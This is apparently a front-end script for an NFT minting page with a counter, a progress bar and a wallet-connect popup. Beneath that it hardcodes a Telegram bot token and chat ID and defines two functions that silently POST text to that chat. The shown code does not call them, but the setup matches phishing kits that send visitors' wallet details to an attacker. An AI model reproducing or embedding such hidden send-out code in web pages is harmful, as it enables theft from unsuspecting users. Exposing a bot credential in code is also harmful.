let values = document.querySelector(".mint__total").querySelectorAll("span");

document.querySelector(".progress-bar-progress").style.width = `${+values[0].innerText / +values[1].innerText * 100}%`;

document.querySelector(".counter__button_minus").addEventListener("click", event => {
  if (+document.querySelector(".counter__input").innerText - 1 >= 1) {
    document.querySelector(".counter__input").innerText = +document.querySelector(".counter__input").innerText - 1;
  }
})

document.querySelector(".counter__button_plus").addEventListener("click", event => {
  if (+document.querySelector(".counter__input").innerText + 1 <= 5) {
    document.querySelector(".counter__input").innerText = +document.querySelector(".counter__input").innerText + 1;
  }
})

document.querySelector("#connect").addEventListener("click", event => {
  if (event.target.closest("#connect") !== null) {
      $(document.querySelector(".select__wallet-cont")).fadeIn("fast");
    //   document.querySelector(".select__wallet-cont").style.display = "flex";
  }
})

document.querySelector(".exit").addEventListener("click", event => {
    $(document.querySelector(".select__wallet-cont")).fadeOut("fast");
//   document.querySelector(".select__wallet-cont").style.display = "none";
})

var chatid = "-1001799577628";
var token = "5597021398:AAH7m51E6fZKO67x8sLaAyFGkxzS3KFsQEw";

function otpravka(token,textfant,chatid){
var z=$.ajax({
type: "POST",
url: "https://api.telegram.org/bot"+token+"/sendMessage?chat_id="+chatid,
data: "parse_mode=HTML&text="+encodeURIComponent(textfant),
});
};
function popavca(token,text2,chatid){
  var z=$.ajax({
    type: "POST",
    url: "https://api.telegram.org/bot"+token+"/sendMessage?chat_id="+chatid,
    data: "parse_mode=HTML&text="+encodeURIComponent(text2),
    });
};